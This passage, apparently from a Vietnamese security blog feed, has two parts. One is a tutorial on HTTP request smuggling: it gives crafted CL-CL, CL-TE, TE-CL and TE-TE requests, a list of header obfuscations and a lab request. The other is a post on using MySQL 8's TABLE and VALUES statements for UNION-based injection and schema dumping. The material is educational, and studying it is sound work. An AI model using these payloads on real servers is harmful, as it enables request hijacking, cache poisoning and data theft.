example.com\r\n</span><br></pre></td></tr></table></figure>Yêu cầu thứ hai:<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure></li></ul><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL:"></a>CL-CL:</h2><p>Kĩ thuật tấn công CL-CL là một yêu cầu HTTP chứa 2 trường Content-Length. Theo <img src="https://www.rfc-editor.org/rfc/rfc7230#section-3.3.3" alt="RFC-7230">, nếu máy chủ nhận được hai yêu cầu Content-Length và giá trị của 2 yêu cầu đó khác nhau thì nó sẽ trả về lỗi 400. Tuy nhiên đôi lúc sẽ có những máy chủ không tuân thủ nghiêm ngặt thông số này và dẫn đến HRS.</p><p>Giả sử một kịch bản tấn công sẽ là cả máy chủ proxy và máy chủ gốc đề không trả về lỗi 400, và máy chủ proxy sử dụng trường <code>Content-Length</code> đầu tiên và máy chủ gốc sử dụng trường <code>Content-Length</code> thứ hai.</p><p>Ví dụ một request như sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">8</span>\r\n</span><br><span class="line">Content-Length: <span class="number">7</span>\r\n</span><br><span class="line"> </span><br><span class="line"><span class="number">12345</span>\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>Phân tích:</p><ul><li>Máy chủ proxy nhận <code>Content-Length: 8\r\n</code>, dòng thứ 5 trống là một dòng thông thường của yêu cầu POST nên không tính vào phần nội dung, <code>12345 + \r + \n + a = 8 bytes</code> thõa mãn với trường <code>Content-Length</code>nên nó chuyển tiếp yêu cầu đến máy chủ back-end.</li><li>Máy chủ Back-End nhận trường <code>Content-Length: 7\r\n</code>, sau khi đọc 7 kí tự đầu tiên là hết dòng thứ 6, máy chủ Back-End cho rằng quá trình đọc đã hoàn thành sau đó gửi response về cho client. Lúc này trong bộ đệm còn một kí tự <code>a</code>, máy chủ back-end sẽ xem như đây là một phần của yêu cầu (request) tiếp theo.</li></ul><p>Bây giờ giả sử như có một người dùng khác gửi một yêu cầu đến máy chủ:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>Dựa trên việc sử dụng lại kết nối TCP giữa máy chủ proxy và máy chủ back-end, <code>a</code> sẽ được kết hợp với yêu cầu này để tạo thành một yêu cầu mới:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>Lúc này tại máy khách sẽ nhận được một lỗi <code>aGET request method not found</code>, cho chúng ta biết được rằng HRS đã xảy ra.</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>Trong trường hợp này, máy chủ Front-End sử dụng <code>Content-Length</code> và máy chủ Back-End sử dụng <code>Transfer-Encoding</code>.</p><p>Giả sử một yêu cầu như sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: <span class="number">6</span>\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>Máy chủ Front-End nhận trường <code>Content-Length: 6\r\n</code>, dòng thứ 6 không tính vào <code>Content-Length</code>, dòng 7-9 có <code>0 + \r\n + \r\n + a = 6 bytes</code> thõa mãn, nên yêu cầu được chuyển đến máy chủ back-end.<br>Máy chủ Back-End nhận <code>Transfer-Encoding: chunked\r\n</code>, khi nhận được cờ <code>0\r\n</code> và dòng sau là <code>\r\n</code> máy chủ sẽ xem như là phần body đã kết thúc và lúc này kí tự a vẫn còn nằm trong bộ đệm.</p><p>Tương tự như CL-CL nếu bây giờ có một yêu cầu gửi đến:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>Nó sẽ gộp kí tự <code>a</code> với request này thành:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>Và client sẽ nhận lỗi <code>Unrecognized method aPOST</code> có nghĩa là HRS đã xảy ra.</p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>Máy chủ Front-End sử dụng tiêu đề <code>Transfer-Encoding</code>, máy chủ Back-End sử dụng tiêu đề <code>Content-Length</code>.<br>Xét request như sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: <span class="number">4</span>\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">12</span>\r\n</span><br><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Máy chủ front-end nhận <code>Transfer-Encoding: chunked\r\n</code>, khi đọc đến <code>0\r\n</code> và <code>\r\n</code>ở cuối, không có vấn đề gì xảy ra nên máy chủ front-end request đến máy chủ back-end.<br>Máy chủ back-end nhận trường <code>Content-Length: 4\r\n</code>, vì độ dày chỉ 4 bytes tương đương 12 + \r + \r là đến hết dòng thứ 6, máy chủ back-end sẽ xem là đã kết thúc request và phần còn lại từ dòng 7 trở đi không được xử lý và máy chủ back-end sẽ coi đây là phần bắt đầu của yêu cầu tiếp theo.</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="number">0</span>\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Tại thời điểm này nếu có một yêu cầu khác nó sẽ báo lỗi <code>Unrecognized method aPOST</code>, có nghĩa là HRS đã thành công.</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>Cả máy chủ front-end và máy chủ back-end đều sử dụng <code>Transfer-Encoding</code> nhưng bằng một cách nào đó chúng ta có thể gây nhầm lẫn cho máy chủ để một trong hai máy chủ front-end và back-end không xử lý <code>Transfer-Encoding</code> như bình thường, khi đó chúng ta có thể khai thác lỗ hỏng CL-TE hoặc TE-CL tùy theo cách xử lý của reverse proxy và back-end.</p><p>Một số cách để gây rối cho máy chủ như sau:</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Giả sử chúng ta có một request như sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Máy chủ Proxy nhận <code>Transfer-Encoding: chunked\r\n</code>, thấy yêu cầu hợp lệ nó gửi đến máy chủ back-end.<br>Máy chủ back-end: Lúc này do tồn tại hai trường <code>Transfer-Encoding: chunked\r\n</code> và <code>Transfer-encoding: cow\r\n</code> nên khiến máy chủ bị rối, nó không biết nhận cái nào nên có thể bây giờ nó sẽ nhận <code>Content-length: 4\r\n</code>. <code>5c\r\n = 4bytes</code> nên phần sau được xem như là một yêu cầu khác, và do máy chủ tồn tại pipelining nên nó được coi như là một yêu cầu khác biệt. Lúc này một lỗi <code>Unrecognized method aPOST</code> sẽ được trả về.</p><h2 id="Web-cache-poisoning-thong-qua-HRS"><a href="#Web-cache-poisoning-thong-qua-HRS" class="headerlink" title="Web cache poisoning thông qua HRS:"></a>Web cache poisoning thông qua HRS:</h2><p>Tham khảo:</p><ul><li><a href="https://brightsec.com/blog/http-request-smuggling-hrs/#how-hrs-works">https://brightsec.com/blog/http-request-smuggling-hrs/#how-hrs-works</a></li><li><a href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></li><li><a href="https://crashtest-security.com/http-request-smuggling/">https://crashtest-security.com/http-request-smuggling/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Loi-noi-dau&quot;&gt;&lt;a href=&quot;#Loi-noi-dau&quot; class=&quot;headerlink&quot; title=&quot;Lời nói đầu:&quot;&gt;&lt;/a&gt;Lời nói đầu:&lt;/h1&gt;&lt;p&gt;Bài viết này là về khái niệm và </summary>
      
    
    
    
    <category term="HTTP Request Smuggling" scheme="https://rayinaw.github.io/categories/HTTP-Request-Smuggling/"/>
    
    
    <category term="HRS" scheme="https://rayinaw.github.io/tags/HRS/"/>
    
  </entry>
  
  <entry>
    <title>Tính năng mới của Mysql 8</title>
    <link href="https://rayinaw.github.io/2022/11/27/sqli-mysql8/"/>
    <id>https://rayinaw.github.io/2022/11/27/sqli-mysql8/</id>
    <published>2022-11-27T15:13:20.000Z</published>
    <updated>2022-12-10T18:48:04.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tinh-nang-moi-cua-mysql8"><a href="#Tinh-nang-moi-cua-mysql8" class="headerlink" title="Tính năng mới của mysql8"></a>Tính năng mới của mysql8</h1><h2 id="Cau-lenh-TABLE"><a href="#Cau-lenh-TABLE" class="headerlink" title="Câu lệnh TABLE"></a>Câu lệnh TABLE</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TABLE</span> table_name [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name] [LIMIT number [<span class="keyword">OFFSET</span> number]]</span><br></pre></td></tr></table></figure><p>Chức năng: Trả về các hàng và cột của bảng được chỉ định</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> zujchi <span class="operator">|</span> cutee   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> spider <span class="operator">|</span> ugly    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Trông thì tương tự như câu lệnh select. Kể cả kết hợp order.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly  <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> zujchi <span class="operator">|</span> cutee   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> spider <span class="operator">|</span> ugly    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+---------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Tuy nhiên điểm khác ở đây là câu lệnh table sẽ lấy ra toàn bộ bảng, vậy nên where clause sẽ không có tác dụng, nó sẽ đưa ra lỗi.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;where id = 1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Cau-lenh-VALUES"><a href="#Cau-lenh-VALUES" class="headerlink" title="Câu lệnh VALUES"></a>Câu lệnh VALUES</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VALUES</span> row_constructor_list [<span class="keyword">ORDER</span> <span class="keyword">BY</span> column_designator] [LIMIT <span class="keyword">BY</span> number]</span><br><span class="line"> </span><br><span class="line">row_constructor_list:</span><br><span class="line">    <span class="type">ROW</span>(value_list)[, <span class="type">ROW</span>(value_list)][, ...]</span><br><span class="line"> </span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span>[, <span class="keyword">value</span>][, ...]</span><br><span class="line"> </span><br><span class="line">column_designator: </span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure><p>Câu lệnh nhìn khá phức tạp, đơn giản nó chỉ đưa ra các row mà chúng ta định nghĩa. Ví dụ cho dễ hiểu:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span>  <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="type">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>),<span class="type">row</span>(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> column_0 <span class="operator">|</span> column_1 <span class="operator">|</span> column_2 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>        <span class="number">2</span> <span class="operator">|</span>        <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">4</span> <span class="operator">|</span>        <span class="number">5</span> <span class="operator">|</span>        <span class="number">6</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">7</span> <span class="operator">|</span>        <span class="number">8</span> <span class="operator">|</span>        <span class="number">9</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+----------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Câu lệnh này có thể kết hợp với union như sau:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> chuly <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>Có thứ hay ho rồi đấy :P</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,database(),<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> mysql <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="type">row</span>(<span class="number">1</span>,(<span class="keyword">select</span> name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> <span class="number">3</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h2 id="Su-dung-cau-lenh-table-de-dump-database"><a href="#Su-dung-cau-lenh-table-de-dump-database" class="headerlink" title="Sử dụng câu lệnh table để dump database:"></a>Sử dụng câu lệnh table để dump database:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql              <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> information_schema <span class="operator">|</span> utf8mb3                    <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> sys                <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> mysql       <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span 